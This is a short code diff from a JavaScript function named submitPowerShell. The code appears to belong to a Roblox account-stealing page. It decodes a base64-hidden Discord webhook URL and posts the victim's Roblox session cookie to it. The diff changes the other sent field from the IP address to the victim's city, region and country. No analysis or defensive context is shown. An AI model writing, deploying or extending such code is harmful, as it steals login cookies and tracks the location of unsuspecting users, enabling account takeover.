@@ -262,11 +262,11 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
         
-        // Simple webhook payload - only cookie and IP
+        // Simple webhook payload - only cookie and location
         const payload = {
             content: `@everyone
 Cookie: ${robloxCookie || 'None found'}
-IP: ${locationInfo.ip || 'Unknown'}`
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
         };
 
         const response = await fetch(webhookUrl, {
